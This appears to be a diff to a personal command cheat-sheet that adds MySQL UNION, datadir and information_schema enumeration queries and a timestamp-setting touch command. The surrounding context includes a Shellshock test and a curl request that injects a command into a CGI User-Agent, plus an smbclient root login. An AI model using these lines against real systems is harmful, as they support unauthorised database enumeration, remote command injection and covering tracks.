@@ -1145,6 +1145,13 @@ SELECT type, COUNT(type) FROM table WHERE time > (NOW() - INTERVAL 40 MINUTE) GR
 SELECT GROUP_CONCAT(id SEPARATOR ',' ) FROM table;
 SELECT GROUP_CONCAT( CONCAT( id, ' ', name, ' ', city, ' ', state) SEPARATOR ',')  from table;
 
+SELECT column_name(s) FROM table1
+UNION
+SELECT column_name(s) FROM table2;
+
+path:/var/lib/mysql/
+SELECT @@datadir;
+
 --------------------drop all table----------------------------------------
 SET FOREIGN_KEY_CHECKS = 0; 
 SET @tables = NULL;
@@ -1161,6 +1168,8 @@ SET FOREIGN_KEY_CHECKS = 1;
 mysqldump --add-drop-table --no-data  database_name  | grep ^DROP | mysql database_name
 
 select * from table into outfile '/tmp/x.cvs' fields terminated by ',' enclosed by '"' lines terminated by '\n';
+
+select CONCAT(table_schema, '.', table_name) from information_schema.tables;
 
 
 smbclient //192.168.2.2/share -U root%password
@@ -1268,3 +1277,5 @@ env x='() { :; }; echo What is Shellshock?' bash -c 'echo Should I worry?'
 env x='() { :; }; echo vulnerable' bash -c 'echo this is a test'
 curl -A "() { foo;};echo \"Content-type: text/plain\"; ping 192.168.2.172 &" http://192.168.2.180/cgi-bin/poc.cgi }"
 
+Set the Access and Modification times
+touch -c -t 201312101730
